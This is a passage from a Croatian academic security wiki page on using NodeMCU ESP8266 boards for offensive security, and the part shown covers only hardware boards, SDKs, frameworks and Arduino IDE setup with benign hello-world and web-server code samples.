+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Adafruit_products_2471_iso_assembled_01_ORIG.jpg" class="image"><img alt="" src="../images/thumb/a/ae/Adafruit_products_2471_iso_assembled_01_ORIG.jpg/180px-Adafruit_products_2471_iso_assembled_01_ORIG.jpg" width="180" height="138" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Adafruit_products_2471_iso_assembled_01_ORIG.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 26.</b> Adafruit Huzzah ESP8266 (Izvor: <a href="https://cdn-learn.adafruit.com/assets/assets/000/024/792/medium800/adafruit_products_2471_iso_assembled_01_ORIG.jpg?1429908417" class="external free" rel="nofollow">https://cdn-learn.adafruit.com/assets/assets/000/024/792/medium800/adafruit_products_2471_iso_assembled_01_ORIG.jpg?1429908417</a>)</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:13231-01.jpg" class="image"><img alt="" src="../images/thumb/7/77/13231-01.jpg/180px-13231-01.jpg" width="180" height="180" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:13231-01.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 27.</b> SparkFun ESP8266 Thing ((Izvor: <a href="https://www.sparkfun.com/products/13231" class="external free" rel="nofollow">https://www.sparkfun.com/products/13231</a>)</div></div></div>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wemosd1.jpg" class="image"><img alt="" src="../images/thumb/8/8d/Wemosd1.jpg/180px-Wemosd1.jpg" width="180" height="94" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wemosd1.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 28.</b> Wemos D1 mini pro (Izvor: <a href="https://www.wemos.cc/product/d1-mini-pro.html" class="external free" rel="nofollow">https://www.wemos.cc/product/d1-mini-pro.html</a>)</div></div></div>
+<p>Iako su ESP8266 moduli korisnički zasigurno prihvatljiviji od rada sa samim ESP8266(EX) čipom, ipak imaju nekoliko nedostataka. Naime, sami moduli nemaju vlastiti USB konektor, pa nije moguće direktno pristupati samoj memoriji, tj. mijenjati firmware. Također, moduli su vrlo osjetljivi na oscilacije u naponu, pa je za pouzdan rad potreban i regulator napona. Naposljetku, moduli, isto tako, nemaju mogućnost automatskog reseta i flashanja<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[20]</a></sup><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[22]</a></sup>.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:F3TS1U6I622HIF9.MEDIUM.jpg" class="image"><img alt="" src="../images/thumb/b/b6/F3TS1U6I622HIF9.MEDIUM.jpg/800px-F3TS1U6I622HIF9.MEDIUM.jpg" width="800" height="305" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:F3TS1U6I622HIF9.MEDIUM.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 23.</b> Custom pločica ili NodeMCU?</div></div></div></div>
+<p>Rješenje donose pločice sa ugrađenim USB-UART mostom, USB konektorom i regulatorom napona<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[8]</a></sup>. Trenutno se na tržištu nudi nekoliko takvih pločica, a u ovom radu ćemo konkretno raditi sa NodeMCU DEVKTIT v2. Osim spomenutog, prednost NodeMCU je i lakše korištenje pinova pri prototipiranju (npr. može se koristiti običan breadboard te nema potrebe za lemljenjem). Pinovi na samoj pločici odgovaraju modulu (ESP-12F), što se i podrazumjeva, s tim da su na pločici, zbog praktičnosti, VCC i GND razdijeljeni na više izlaza/ulaza. 
+</p><p>Specifične komponente koje su na NodeMCU pločici jesu:
+</p>
+<ul><li>CH430 USB-UART most - omogućuje komunikaciju između računala i pločice što uvelike olakšava programiranje (za komunikaciju putem Windows operacijskog sustava potrebno je preuzeti odgovarajući driver, dok na Linux Ubuntu radi bez posebnih drivera)
+</li><li>Micro USB konektor - omogućuje spajanje s računalom putem standardnog micro USB - USB kabla 
+</li><li>IRU1117-33 - 3.3V regulator napona
+</li></ul>
+<p>Naziv NodeMCU često se odnosi i na sam Lua framework za ESP8266 od istog proizvođača (<a href="https://github.com/nodemcu" class="external free" rel="nofollow">https://github.com/nodemcu</a>), no više o dostupnim framework i SDK paketima u sljedećem poglavlju. Također, postoji više inačica pločice NodeMCU, no razlike nisu velike, više o tome može se pročitati na <a href="http://frightanic.com/iot/comparison-of-esp8266-nodemcu-development-boards/" class="external free" rel="nofollow">http://frightanic.com/iot/comparison-of-esp8266-nodemcu-development-boards/</a>.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07808m2.jpg" class="image"><img alt="" src="../images/thumb/8/83/DSC07808m2.jpg/800px-DSC07808m2.jpg" width="800" height="501" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:DSC07808m2.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 24.</b> NodeMCU DEVKIT v2</div></div></div></div>
+<p>Osim NodeMCU pločice, na tržištu postoji nekoliko pločica sa vrlo sličnim karakteristikama, neke od češće korištenih jesu:
+</p>
+<ul><li><a href="https://www.adafruit.com/product/2471" class="external text" rel="nofollow">Adafruit Huzzah ESP8266</a>
+</li><li><a href="https://www.sparkfun.com/products/13231" class="external text" rel="nofollow">SparkFun ESP8266 Thing</a> 
+</li><li><a href="https://www.wemos.cc/product" class="external text" rel="nofollow">Wemos D1</a>, itd.
+</li></ul>
+<h2> <span class="mw-headline" id="ESP8266_SDKs.2C_frameworks_i_IDEs"> ESP8266 SDKs, frameworks i IDEs </span></h2>
+<p>Kako je već spomenuto, korisnicima je u programiranju pločica s ESP8266 čipom dostupno nekoliko SDK-ova i frameworkova, a na raspolaganju je i nekoliko IDE-ova koji imaju podršku za ESP8266. 
+</p>
+<h3> <span class="mw-headline" id="Slu.C5.BEbeni_Espriff_SDK"> Službeni Espriff SDK </span></h3>
+<p>Prvi SDK je i onaj službeni od samog proizvođača. Espriff, zapravo, nudi na raspolaganje dva SDK paketa<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[17]</a></sup>:
+</p>
+<ul><li> NON-OS SDK
+</li><li> RTOS SDK
+</li></ul>
+<p>NON-OS SDK nudi sav dostupan standardni API za programiranje u C-u te podržava samo singlethreaded arhitekturu, dok RTOS SDK, koji je baziran na <a href="http://www.freertos.org/" class="external text" rel="nofollow">FreeRTOS</a> operacijskom sustavu, nudi bolju podršku za mulithreading/multitasking. Osim dostupnog API-ja, u SDK-u su sadržani mnogi primjeri korištenja istog, a na raspolaganju je i službena dokumentacija dostupna na <a href="https://espressif.com/sites/default/files/documentation/2c-esp8266_non_os_sdk_api_reference_en.pdf" class="external free" rel="nofollow">https://espressif.com/sites/default/files/documentation/2c-esp8266_non_os_sdk_api_reference_en.pdf</a><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[17]</a></sup>.
+</p><p>Da bi koristili službeni SDK potrebno ga je preuzeti sa stranica proizvođača u obliku izvornog koda, te ga kompajlirati na vlastitom računalu<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[23]</a></sup>. Za kompajliranje je potrebno GNU/Linux okruženje. Najčešće se koristi NON-OS SDK pa ćemo na njega obratiti više pažnje.
+</p>
+<h4> <span class="mw-headline" id="Dostupni_API"> Dostupni API </span></h4>
+<p>Službeni NON-OS SDK nudi sljedeće API biblioteke<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[17]</a></sup>:
+</p>
+<ul><li>Software timer
+</li><li>Hardware timer
+</li><li>Sustavski API
+</li><li>SPI flash povezani API
+</li><li>WiFi API
+</li><li>Rate Control API
+</li><li>Force Sleep API
+</li><li>ESP-NOW API
+</li><li>Simple Pair API
+</li><li>Upgrade API
+</li><li>Sniffer API
+</li><li>Smart Config API
+</li><li>SNTP API
+</li><li>WPA2_Enterprise API
+</li><li>TCP/UDP (Espconn) API
+</li><li>mDNS API
+</li><li>Mesh API
+</li><li>API aplikacijskog sloja (JSON, AT, itd.)
+</li><li>GPIO API
+</li><li>UART API
+</li><li>I2C API
+</li><li>PWM API
+</li><li>SDIO API
+</li></ul>
+<p>Da bi mogli koristiti navedene API biblioteke, potrebno je u program uključiti header (.h) datoteke koje ih sadržavaju. U nastavku je dan popis dostupnih headera i kratka pojašnjenja, a detaljna pojašnjena dostupna su u službenoj SDK dokumentaciji. Header datoteke se nalaze u <i>include</i> mapi SDK-a.
+</p><p>Headeri i pojašnjenja<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[23]</a></sup>:
+</p>
+<table class="wikitable">
+
+<tr>
+<th>Datoteka
+</th>
+<th>Opis
+</th></tr>
+<tr>
+<td>at_custom.h
+</td>
+<td>Definicije za  prilagođene ekstenzije AT naredbenog handlera.
+</td></tr>
+<tr>
+<td>c_types.h
+</td>
+<td>Definicije iz C jezika.
+</td></tr>
+<tr>
+<td>eagle_soc.h
+</td>
+<td>Low-level definicije i macrosi.
+</td></tr>
+<tr>
+<td>espconn.h
+</td>
+<td>TCP i UDP definicije.
+</td></tr>
+<tr>
+<td>espnow.h
+</td>
+<td>Definicije za ESPNOW.
+</td></tr>
+<tr>
+<td>gpio.h
+</td>
+<td>Definicije za interakciju sa GPIO.
+</td></tr>
+<tr>
+<td>ip_addr.h
+</td>
+<td>Definicije za IP adrese.
+</td></tr>
+<tr>
+<td>mem.h
+</td>
+<td>Definicije za manipulaciju memorijom
+</td></tr>
+<tr>
+<td>os_type.h
+</td>
+<td>Definicije operacijskog sustava.
+</td></tr>
+<tr>
+<td>osapi.h
+</td>
+<td>Definicije za korisnike postavke.
+</td></tr>
+<tr>
+<td>ping.h
+</td>
+<td>Definicije za ping.
+</td></tr>
+<tr>
+<td>pwm.h
+</td>
+<td>Definicije za PWM.
+</td></tr>
+<tr>
+<td>sntp.h
+</td>
+<td>Definicije za SNTP.
+</td></tr>
+<tr>
+<td>queue.h
+</td>
+<td>Definicije za redove.
+</td></tr>
+<tr>
+<td>smartconfig.h
+</td>
+<td>Smartconfig definicije.
+</td></tr>
+<tr>
+<td>spi_flash.h
+</td>
+<td>Definicije za flashanja.
+</td></tr>
+<tr>
+<td>upgrade.h
+</td>
+<td>Definicije za nadogradnje.
+</td></tr>
+<tr>
+<td>user_interface.h
+</td>
+<td>Definicije za OS i WiFi. Ovaj header najviše ćemo koristiti u mrežnom radu.
+</td></tr></table>
+<h4> <span class="mw-headline" id="Tijek_razvoja_u_SDK"> Tijek razvoja u SDK </span></h4>
+<p>Prema naputku iz SDK dokumentacije, ulaz u korisnički program bi trebao biti u <code>user_main.c</code> datoteci unutar metode <code>void user_init(void)</code>. Kako SDK podržava samo singlethreaded rad, programer se mora oslanjati na korištenje timera, taskova i callback funkcija.
+</p><p>Primjer Hello World programa u SDK-u (<a href="https://github.com/leon-anavi/esp-hello-world/blob/master/user/user_main.c" class="external free" rel="nofollow">https://github.com/leon-anavi/esp-hello-world/blob/master/user/user_main.c</a>):
+</p>
+<pre>
+#include &quot;ets_sys.h&quot;
+#include &quot;osapi.h&quot;
+#include &quot;os_type.h&quot;
+#include &quot;user_config.h&quot;
+
+#define user_procTaskPrio        0
+#define user_procTaskQueueLen    1
+
+os_event_t    user_procTaskQueue[user_procTaskQueueLen];
+static void user_procTask(os_event_t *events);
+
+//Hello world task
+static void ICACHE_FLASH_ATTR
+task_hello(os_event_t *events)
+{
+  //print text to the serial output
+  os_printf(&quot;Hello World!\r\n&quot;);
+}
+
+//Init function
+void ICACHE_FLASH_ATTR
+user_init()
+{
+  // Initialize UART0
+  uart_div_modify(0, UART_CLK_FREQ / 115200);
+
+  //Set up the hello world task
+  system_os_task(task_hello, user_procTaskPrio, user_procTaskQueue, user_procTaskQueueLen);
+  //send a message to the &quot;hello world&quot; task to activate it
+  system_os_post(user_procTaskPrio, 0, 0 );
+}
+</pre>
+<p>Kako iz priloženog primjera možemo vidjeti, pisanje programa u službenom SDK-u potražuje dosta znanja o low level programiranju i dobro poznavanje samog SDK-a. Kako bi se smanjila zahtijevnost rada sa ESP8266 platformama, razvijeni su neki od neslužbenih SDK-ova i frameworka.
+</p>
+<h3> <span class="mw-headline" id="ESP_Open_SDK"> ESP Open SDK </span></h3>
+<p>Pored službenog SDK-a, razvija se i SDK otvorenog koda - ESP Open SDK. Glavna razlika između službenog i open SDK-a leži u činjenici da je većina koda u Open SDK-u open source, tj. binarni paketi i ostale biblioteke koje nisu slobodne licence<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[22]</a></sup>.
+</p><p>ESP Open SDK može se naći na sljedećem git repozitoriju:
+<a href="https://github.com/pfalcon/esp-open-sdk" class="external free" rel="nofollow">https://github.com/pfalcon/esp-open-sdk</a>
+</p>
+<h3> <span class="mw-headline" id="NodeLua.2FNodeMCU_eLua_Firmwares"> NodeLua/NodeMCU eLua Firmwares </span></h3>
+<p><a href="https://nodelua.org/" class="external text" rel="nofollow">NodeLua</a> i <a href="https://github.com/nodemcu/nodemcu-firmware" class="external text" rel="nofollow">NodeMCU eLua</a> dva su frameworka koja se baziraju na orginalnom Espriffovom SDK-u, tj. korisniku daju apstrakciju funkcionalnosti orginalnih API-ja te mu tako omogućavaju brži razvoj i umanjuju potrebu za znanjem C-a i orginalnog SDK-a. 
+</p><p>Primjer koda za postavljanje http servera na ESP8266 pločici u NodeMCU eLua frameworku:
+</p>
+<pre>
+-- a simple HTTP server
+srv = net.createServer(net.TCP)
+srv:listen(80, function(conn)
+    conn:on(&quot;receive&quot;, function(sck, payload)
+        print(payload)
+        sck:send(&quot;HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n\r\n&lt;h1&gt; Hello, NodeMCU.&lt;/h1&gt;&quot;)
+    end)
+    conn:on(&quot;sent&quot;, function(sck) sck:close() end)
+end)
+</pre>
+<p>Nažalost, prema mišljenjima mnogih korisnika, korištenje Lua interpretera ima utjecaja na ionako minijaturne resurse ESP8266 pločice, pa se često može dogoditi da pločica ostane bez memorije ili se jednostavno sruši. Unatoč tome, framework (barem NodeMCU) je pod konstantnim razvojem pa se očekuje da ovakvih problema u budućnosti neće biti.
+</p><p>Više o NodeMCU frameworku može se naći u službenoj dokumentaciji na <a href="https://nodemcu.readthedocs.io/en/master/" class="external free" rel="nofollow">https://nodemcu.readthedocs.io/en/master/</a>
+</p>
+<h3> <span class="mw-headline" id="MicroPython"> MicroPython </span></h3>
+<p>Kao i Lua frameworkovi, MicroPython je još jedan framework namijenjen za IOT uređaje, pa je, naravno, shodan za korištenje i na ESP8266 platformama. Razlika između Lue i MicroPythona je ta što se MicroPython kompajlira u bytecode <i>at-compiletime</i> te se izvršava <i>bare-metal</i> na samom uređaju, što svakako ima manji utjecaj na resurse uređaja. Naravno, MicroPython može izvršavati i source coude Python skripte, dakle vrijedi (compile  +  runtime), a također daje i pristup Python shell-u, odnosno REPL-u. MicroPython podržava gotovo cjelovit Python sintaksu, pa samim time i dobar dio Python biblioteka. Za MicroPython također implementiran i MicroPIP, pa je i instalacija dodatnih biblioteka vrlo jednostavna<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[22]</a></sup><sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[24]</a></sup>.
+</p><p><br />
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:502px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Upython-with-micro.jpg" class="image"><img alt="" src="../images/thumb/b/b6/Upython-with-micro.jpg/500px-Upython-with-micro.jpg" width="500" height="250" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Upython-with-micro.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 30.</b> Micropython (Izvor: <a href="https://github.com/micropython/micropython" class="external free" rel="nofollow">https://github.com/micropython/micropython</a>)</div></div></div></div>
+<p>Primjer upravljanja pinovima i ispis u konzolu<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[24]</a></sup>:
+</p>
+<pre>
+import pyb
+
+# turn on an LED
+pyb.LED(1).on()
+
+# print some text to the serial console
+print('Hello MicroPython!')
+</pre>
+<p>Neke od najznačajnijih karakteristika MicroPythona jesu<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[24]</a></sup>:
+</p>
+<ul><li>veliki broj opcija pri compile-timeu
+</li><li>podrška sa mnoge arhitekture (x86, x86-64, ARM, ARM Thumb, Xtensa) - prenosivost koda
+</li><li>garbage collector za heap memoriju
+</li><li>mogućnost obrade grešaka pri prevelikoj alokaciji dostupne memorije
+</li><li>multithreading (_thread)
+</li><li>inline assembler
+</li><li>mogućnost pronalazaka grešaka u kodu pri runtimeu (backtracing)
+</li></ul>
+<p>MicroPython ima dosta naprednih mogućnosti, a više o tome na <a href="https://micropython.org/" class="external free" rel="nofollow">https://micropython.org/</a>
+</p>
+<h3> <span class="mw-headline" id="Arduino_Core_ESP8266"> Arduino Core ESP8266 </span></h3>
+<p>Arduino Core projekt je koji omogućuje korištenje Arduino biblioteka unutar Arduino IDE-a za ESP8266 platforme. Arduino Core zapravo je najpopularnija opcija za programiranje ove pločice i to iz nekoliko razloga<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[22]</a></sup>:
+</p>
+<ul><li>kao i kod predhodnih frameworkova, nije potrebno duboko poznavanje SDK-a ili low level programiranja
+</li><li>Arduino je na tržištu već dugo vremena i vrlo je popularan, pa su korisnici već upoznati sa standardnim Arduino bibliotekama i ne moraju se ponovno učiti novim tehnologijama
+</li><li>kod koji radi na Arduino platformama radit će i na ESP8266 - prenosivost
+</li><li>kako se i sami Arduino programi pišu u C++ jeziku, korisniku je omogućeno direktno uključiti neku biblioteku iz orginalnog SDK-a, ako mu korištenje Arduino biblioteka nije moguće
+</li></ul>
+<p>Cijeli Arduino Core za ESP8266 zapravo je pokušaj da se sučelja koja su već postojala kod samog Arduina re-mapiraju na orginalne SDK biblioteke, te se samim time smanji ono što korisnik treba učiti<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[23]</a></sup>. Pa tako Arduino COre dolazi sa bibliotekama za rad sa WiFi-jem<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[25]</a></sup>.:
+</p>
+<ul><li>TCP/UDP
+</li><li>HTTP
+</li><li>mDNS
+</li><li>SSDP
+</li><li>DNS
+</li><li>OTA nadogradnje
+</li></ul>
+<p>a osim toga i s bibliotekama za rad sa<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[25]</a></sup>.:
+</p>
+<ul><li>datotečnim sustavom i flash memorijom
+</li><li>SD karticama
+</li><li>servo motorima
+</li><li>SPI, I2C, GPIO, itd.
+</li></ul>
+<p>Slijedi primjer jednostavnog "hello" webservera napisanog u Arduino Coreu<sup><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#Literatura">[25]</a></sup>.:
+</p>
+<pre>
+#include &lt;ESP8266WiFi.h&gt;
+#include &lt;WiFiClient.h&gt;
+#include &lt;ESP8266WebServer.h&gt;
+#include &lt;ESP8266mDNS.h&gt;
+
+const char* ssid = &quot;........&quot;;
+const char* password = &quot;........&quot;;
+
+ESP8266WebServer server(80);
+
+const int led = 13;
+
+void handleRoot() {
+  digitalWrite(led, 1);
+  server.send(200, &quot;text/plain&quot;, &quot;hello from esp8266!&quot;);
+  digitalWrite(led, 0);
+}
+
+void handleNotFound(){
+  digitalWrite(led, 1);
+  String message = &quot;File Not Found\n\n&quot;;
+  message += &quot;URI: &quot;;
+  message += server.uri();
+  message += &quot;\nMethod: &quot;;
+  message += (server.method() == HTTP_GET)?&quot;GET&quot;:&quot;POST&quot;;
+  message += &quot;\nArguments: &quot;;
+  message += server.args();
+  message += &quot;\n&quot;;
+  for (uint8_t i=0; i&lt;server.args(); i++){
+    message += &quot; &quot; + server.argName(i) + &quot;: &quot; + server.arg(i) + &quot;\n&quot;;
+  }
+  server.send(404, &quot;text/plain&quot;, message);
+  digitalWrite(led, 0);
+}
+
+void setup(void){
+  pinMode(led, OUTPUT);
+  digitalWrite(led, 0);
+  Serial.begin(115200);
+  WiFi.begin(ssid, password);
+  Serial.println(&quot;&quot;);
+
+  // Wait for connection
+  while (WiFi.status()&#160;!= WL_CONNECTED) {
+    delay(500);
+    Serial.print(&quot;.&quot;);
+  }
+  Serial.println(&quot;&quot;);
+  Serial.print(&quot;Connected to &quot;);
+  Serial.println(ssid);
+  Serial.print(&quot;IP address: &quot;);
+  Serial.println(WiFi.localIP());
+
+  if (MDNS.begin(&quot;esp8266&quot;)) {
+    Serial.println(&quot;MDNS responder started&quot;);
+  }
+
+  server.on(&quot;/&quot;, handleRoot);
+
+  server.on(&quot;/inline&quot;, [](){
+    server.send(200, &quot;text/plain&quot;, &quot;this works as well&quot;);
+  });
+
+  server.onNotFound(handleNotFound);
+
+  server.begin();
+  Serial.println(&quot;HTTP server started&quot;);
+}
+
+void loop(void){
+  server.handleClient();
+}
+</pre>
+<p>Arduino Core je, zbog same prirode projekta, vezan uz Arduino IDE - službeno razvojno okružje za Arduino platforme. Unatoč tome, moguće je koristiti i nekoliko drugih IDE-ova, o čemu malo više kasnije.
+</p><p><br />
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:705px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Arduino.png" class="image"><img alt="" src="../images/6/63/Arduino.png" width="703" height="629" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Arduino.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 31.</b> Arduino IDE i NodeMCU pločica</div></div></div></div>
+<p><br />
+Za potrebe ovog projekta <b>koristit će se upravo Arduino Core</b>, izmeđuostalog, zbog gore navedenih prednosti, a u nastavku rada detaljnije ćemo pogldati kako postaviti razvojno okružje.
+</p>
+<h3> <span class="mw-headline" id="Javascript.2C_Basic.2C_Lisp.2C_itd."> Javascript, Basic, Lisp, itd. </span></h3>
+<p>Kako je već prije navedeno, za ESP8266 napravljeno je već nekoliko portova drugih jezika, pa tako, npr., imamo Javascript, Basic, Lisp, itd. Kako navedeni portovi nisu toliko popularni, niti ćemo ih koristiti u ovome projektu, ovdje ih nećemo posebno obrađivati, pa u nastavku slijede linkovi na njihove službene projekte:
+</p>
+<ul><li><a href="https://github.com/espruino" class="external free" rel="nofollow">https://github.com/espruino</a>
+</li><li><a href="https://github.com/yesco/esp-lisp" class="external free" rel="nofollow">https://github.com/yesco/esp-lisp</a>
+</li><li><a href="https://www.esp8266basic.com/" class="external free" rel="nofollow">https://www.esp8266basic.com/</a>
+</li></ul>
+<h2> <span class="mw-headline" id="Postavljanje_Arduino_Corea_i_Eclipse_IDE-a"> Postavljanje Arduino Corea i Eclipse IDE-a </span></h2>
+<p>Prije no što možemo stavljati korisničke programe, potreno nam je imati odgovarajuću razvojnu okolinu i programsku podršku. Kako smo odlučili raditi u Arduino Core frameworku, potrebno nam je Arduino razvojno okružje. U nekoliko sljedećih koraka pokazano je kako postaviti sve potrebno za razvoj. Upute su pisane za Linux operacijski sustav, no slično bi trebalo vrijediti i za ostale sustave.
+</p>
+<h3> <span class="mw-headline" id="Arduino_IDE"> Arduino IDE </span></h3>
+<p>Prvo je potrebno istalirati Arduino IDE kojeg se može preuzeti putem <a href="https://www.arduino.cc/en/Main/OldSoftwareReleases#previous" class="external free" rel="nofollow">https://www.arduino.cc/en/Main/OldSoftwareReleases#previous</a>. Preporuča se preuzeti inačicu 1.6.X, jer je ista testirana sa pločicom s kojom se radi u projektu.
+</p>
+<h3> <span class="mw-headline" id="Arduino_Core"> Arduino Core </span></h3>
+<p>Za rad sa sa ESP8266 pločicom u Arduino okružju, potreban je već spomenut Arduino Core framework. Framework je moguće preuzeti iz samog Arduina, no zbog potreba upravljanja različitim verzijama, Arduino Core ćemo preuzeti sa službenog Git repozitorija.
+</p><p>Prvo je potrebno unutar Arduino mape na datotečnom sustavu kreirati mapu <tt>&gt;hardware/esp8266com</tt>, pa onda u njoj klonirati Arduino Core sa repozitorija <a href="https://github.com/esp8266/Arduino.git" class="external free" rel="nofollow">https://github.com/esp8266/Arduino.git</a> (potrebno je imati instalirani git):
+</p>
+<pre>
+rloka@r2d2:/$ cd ~/Arduino/
+rloka@r2d2:~/Arduino$ mkdir hardware/esp8266com
+rloka@r2d2:~/Arduino$ git clone https://github.com/esp8266/Arduino.git
+</pre>
+<p>Nakon toga bi u Arduino IDE-u trebali imati mogućnost odabira NodeMCU ESP8266 pločice, kako je prikazano na prikazu ispod.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Board.png" class="image"><img alt="" src="../images/thumb/5/5e/Board.png/800px-Board.png" width="800" height="640" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Board.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 32.</b> Arduino IDE sa podrškom za NodeMCU pločicu</div></div></div></div>
+<p>Za konkretnu pločicu sa kojom radimo u ovom projektu u IDE-u je potrebno postaviti sljedeće postavke:
+</p>
+<table class="wikitable">
+<tr>
+<th>Board
+</th>
+<td>NodeMCU 1.0 (ESP-12E Module)
+</td></tr>
+<tr>
+<th>Upload using
+</th>
+<td>Serial
+</td></tr>
+<tr>
+<th>CPU frequency
+</th>
+<td>80 HZ
+</td></tr>
+<tr>
+<th>Flash size
+</th>
+<td>4M (3M SPIFFS)
+</td></tr>
+<tr>
+<th>Upload speed
+</th>
+<td>115200
+</td></tr>
+<tr>
+<th>Port
+</th>
+<td>/dev/ttyUSB0
+</td></tr></table>
+<p>Također, prilikom čitanja ispisa sa serijskog ulaza/izlaza, potrebno je postaviti baud rate na 115200
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:569px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Serial.png" class="image"><img alt="" src="../images/6/6c/Serial.png" width="567" height="347" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Serial.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 33.</b> Ispis na serijskom monitoru Arduino IDE-a</div></div></div></div>
+<h3> <span class="mw-headline" id="Eclipse_.28Sloeber.29_IDE"> Eclipse (Sloeber) IDE </span></h3>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Eclipse-arduino-workspace.png" class="image"><img alt="" src="../images/thumb/b/bc/Eclipse-arduino-workspace.png/180px-Eclipse-arduino-workspace.png" width="180" height="96" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Eclipse-arduino-workspace.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 35.</b> Izgled korisničkog sučelja Eclipse IDE-a</div></div></div>
+<p>Iako je Arduino IDE sasvim dovoljan za razvoj programa na ESP8266 pločici, u ovom dijelu pokazati ćemo kako koristiti Eclipse (Sloeber) IDE. Naime, Arduino IDE nema neke od naprednijih mogućnosti koje su dostupne u ostalim standardnim kod editorima, poput provjere sintakse prije kompajliranja, intelisensa, naprednih postavki, itd., pa smo se u nastavku rada odlučili koristiti Eclipse (Sloeber) IDE, koji ima potpunu podršku za Arduino i ESP8266. 
